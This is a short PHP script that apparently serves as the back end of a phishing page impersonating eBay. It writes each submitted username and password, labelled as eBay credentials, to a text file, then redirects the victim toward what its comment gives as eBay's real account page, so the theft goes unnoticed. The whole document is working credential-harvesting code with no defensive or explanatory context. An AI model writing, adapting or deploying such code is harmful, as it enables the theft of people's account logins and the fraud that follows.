<?php

file_put_contents("usernames.txt", "Ebay Username: " . $_POST['userid'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://accounts.ebay.com/acctxs/user
header("Location: $url");
exit();
?>
